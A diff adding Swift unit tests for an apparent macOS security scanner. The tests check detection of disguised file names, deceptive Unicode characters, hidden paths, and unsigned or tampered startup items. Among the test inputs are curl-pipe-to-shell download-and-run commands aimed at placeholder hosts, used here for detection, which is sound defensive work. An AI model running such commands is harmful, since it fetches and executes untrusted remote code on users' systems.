@@ -352,3 +352,143 @@ final class SettingsTests: XCTestCase {
         }
     }
 }
+
+/// Security Check rules and scanner. Signature results are injected so rules are tested precisely.
+final class SecurityCheckTests: XCTestCase {
+    private let home = "/Users/tester"
+
+    private func startup(_ program: String, arguments: [String]? = nil, status: SignatureStatus) -> SecurityFinding? {
+        var plist: [String: Any] = ["Label": "test"]
+        plist["ProgramArguments"] = arguments ?? [program]
+        return SecurityRules.assessStartupItem(plistPath: "/Users/tester/Library/LaunchAgents/test.plist", plist: plist,
+                                               signature: { _ in status }, home: home)
+    }
+
+    // MARK: Name rules
+
+    func testDisguisedNames() {
+        XCTAssertTrue(SecurityRules.isDisguisedName("Invoice.pdf.app"))
+        XCTAssertTrue(SecurityRules.isDisguisedName("photo.JPG.command"))
+        XCTAssertTrue(SecurityRules.isDisguisedName("statement.docx.pkg"))
+        XCTAssertFalse(SecurityRules.isDisguisedName("Visual Studio Code.app"))
+        XCTAssertFalse(SecurityRules.isDisguisedName("report.pdf"))
+        XCTAssertFalse(SecurityRules.isDisguisedName("archive.tar.gz"), "two document-like extensions are normal")
+        XCTAssertFalse(SecurityRules.isDisguisedName("my.app.backup"))
+    }
+
+    func testDeceptiveCharacters() {
+        XCTAssertTrue(SecurityRules.hasDeceptiveCharacters("invoice\u{202E}fdp.app"), "right-to-left override")
+        XCTAssertTrue(SecurityRules.hasDeceptiveCharacters("setup\u{200B}.pkg"), "zero-width space")
+        XCTAssertFalse(SecurityRules.hasDeceptiveCharacters("Résumé 2026 – final.pdf"))
+    }
+
+    func testDownloadAndRunCommands() {
+        XCTAssertTrue(SecurityRules.isDownloadAndRun(["/bin/sh", "-c", "curl -s https://x.example/p | sh"]))
+        XCTAssertTrue(SecurityRules.isDownloadAndRun(["/bin/bash", "-c", "curl -fsSL https://x/y | base64 -d > /tmp/a; chmod +x /tmp/a"]))
+        XCTAssertFalse(SecurityRules.isDownloadAndRun(["/bin/sh", "-c", "echo hello"]))
+        XCTAssertFalse(SecurityRules.isDownloadAndRun(["/usr/bin/curl", "https://example.com"]), "curl alone isn't a shell running code")
+    }
+
+    func testHiddenPaths() {
+        XCTAssertTrue(SecurityRules.isHiddenPath("/Users/tester/.local/bin/agent", home: home))
+        XCTAssertTrue(SecurityRules.isHiddenPath("/Users/tester/Library/Application Support/.x/run", home: home))
+        XCTAssertFalse(SecurityRules.isHiddenPath("/Applications/Zoom.app/Contents/MacOS/zoom", home: home))
+    }
+
+    // MARK: Startup items
+
+    func testNormalStartupItemsAreNotFlagged() {
+        XCTAssertNil(startup("/Applications/Zoom.app/Contents/MacOS/updater", status: .developer(name: "Zoom", team: "BJ4HAAB9B3")))
+        XCTAssertNil(startup("/usr/libexec/xpcproxy", status: .apple))
+        XCTAssertNil(startup("/opt/homebrew/bin/watchman", status: .adHoc), "Homebrew tools are ad-hoc signed; that's normal")
+        XCTAssertNil(startup("/Users/Shared/Riot Games/Riot Client.app/Contents/MacOS/RiotClientServices",
+                             status: .developer(name: "Riot Games", team: "B2X5H7Q9C4")),
+                     "a signed program in /Users/Shared is fine")
+    }
+
+    func testSuspiciousStartupItems() {
+        XCTAssertEqual(startup("/Users/tester/.cache/.agent/run", status: .developer(name: "X", team: "Y"))?.level, .suspicious,
+                       "hidden folder")
+        XCTAssertEqual(startup("/Users/Shared/updater", status: .unsigned)?.level, .suspicious, "unsigned in a shared folder")
+        XCTAssertEqual(startup("/private/tmp/x", status: .adHoc)?.level, .suspicious)
+        XCTAssertEqual(startup("/Applications/App.app/Contents/MacOS/app", status: .invalid("modified"))?.level, .unusual,
+                       "self-updating apps break their own signature; alone that's only unusual")
+        XCTAssertEqual(startup("/Users/tester/.x/app", status: .invalid("modified"))?.level, .suspicious,
+                       "combined with another red flag it is suspicious")
+        let curl = startup("/bin/sh", arguments: ["/bin/sh", "-c", "curl https://x | sh"], status: .apple)
+        XCTAssertEqual(curl?.level, .suspicious, "Apple's /bin/sh running a download is still suspicious")
+        XCTAssertEqual(curl?.program, "/bin/sh")
+    }
+
+    func testUnusualStartupItems() {
+        let missing = startup("/Applications/Removed.app/Contents/MacOS/helper", status: .missing)
+        XCTAssertEqual(missing?.level, .unusual)
+        XCTAssertTrue(missing?.reasons.first?.contains("no longer exists") ?? false)
+        XCTAssertEqual(startup("/Applications/Tool.app/Contents/MacOS/tool", status: .unsigned)?.level, .unusual)
+        XCTAssertNil(SecurityRules.assessStartupItem(plistPath: "/x.plist", plist: ["Label": "empty"], signature: { _ in .unsigned }, home: home),
+                     "no program, nothing to judge")
+    }
+
+    // MARK: Apps
+
+    func testAppRules() {
+        XCTAssertNil(SecurityRules.assessApp(path: "/Applications/Good.app", signature: .developer(name: "A", team: "B")))
+        XCTAssertEqual(SecurityRules.assessApp(path: "/Applications/OpenSource.app", signature: .unsigned)?.level, .unusual)
+        XCTAssertEqual(SecurityRules.assessApp(path: "/Applications/Patched.app", signature: .invalid("modified"))?.level, .unusual,
+                       "installed apps that patch themselves (e.g. game launchers) aren't called suspicious")
+        XCTAssertEqual(SecurityRules.assessApp(path: "/Users/t/Downloads/Tampered.app", signature: .invalid("modified"),
+                                               category: .downloads)?.level, .suspicious, "a mismatched download is")
+        XCTAssertEqual(SecurityRules.assessApp(path: "/Users/t/Downloads/Invoice.pdf.app",
+                                               signature: .developer(name: "A", team: "B"), category: .downloads)?.level, .suspicious)
+    }
+
+    // MARK: Real signature checks (read-only)
+
+    func testCodeSignatureChecks() throws {
+        XCTAssertEqual(CodeSignature.status(ofPath: "/bin/ls"), .apple)
+        XCTAssertEqual(CodeSignature.status(ofPath: "/no/such/program"), .missing)
+        let fixture = try TestFixture()
+        let script = try fixture.file("tool.sh", bytes: 0)
+        try "#!/bin/sh\necho hi\n".write(toFile: script, atomically: true, encoding: .utf8)
+        XCTAssertEqual(CodeSignature.status(ofPath: script), .unsigned)
+    }
+
+    // MARK: Scanner on fixtures
+
+    func testScannerOnFixtures() throws {
+        let fixture = try TestFixture(name: "home")
+        let agents = try fixture.dir("Library/LaunchAgents")
+        let hiddenProgram = try fixture.file(".hidden/agent", bytes: 100)
+        func writeAgent(_ name: String, _ program: String) throws {
+            let plist: [String: Any] = ["Label": name, "ProgramArguments": [program], "RunAtLoad": true]
+            try PropertyListSerialization.data(fromPropertyList: plist, format: .xml, options: 0)
+                .write(to: URL(fileURLWithPath: PathUtil.join(agents, "\(name).plist")))
+        }
+        try writeAgent("com.bad.hidden", hiddenProgram)
+        try writeAgent("com.good.app", "/bin/ls")
+        try writeAgent("com.gone.helper", fixture.path("Applications/Gone.app/Contents/MacOS/helper"))
+
+        let downloads = try fixture.dir("Downloads")
+        try fixture.file("Downloads/Invoice.pdf.command", bytes: 10)
+        try fixture.file("Downloads/report.pdf", bytes: 10)
+        let hiddenExec = try fixture.file("Downloads/.run", bytes: 10)
+        chmod(hiddenExec, 0o755)
+        let projectExec = try fixture.file("Downloads/project/node_modules/.bin/tool", bytes: 10)
+        chmod(projectExec, 0o755)
+
+        var scanner = SecurityScanner(home: fixture.path, startupFolders: [agents], appFolders: [],
+                                      downloadFolders: [downloads])
+        scanner.signature = { CodeSignature.status(ofPath: $0) }
+        let findings = scanner.scan()
+        let byName = Dictionary(uniqueKeysWithValues: findings.map { ($0.name, $0) })
+
+        XCTAssertEqual(byName["com.bad.hidden.plist"]?.level, .suspicious)
+        XCTAssertEqual(byName["com.gone.helper.plist"]?.level, .unusual)
+        XCTAssertNil(byName["com.good.app.plist"], "Apple-signed program isn't flagged")
+        XCTAssertEqual(byName["Invoice.pdf.command"]?.level, .suspicious)
+        XCTAssertEqual(byName[".run"]?.level, .suspicious)
+        XCTAssertNil(byName["report.pdf"])
+        XCTAssertNil(byName["tool"], "executables inside node_modules are normal and skipped")
+        XCTAssertEqual(findings.first?.level, .suspicious, "suspicious items are listed first")
+    }
+}
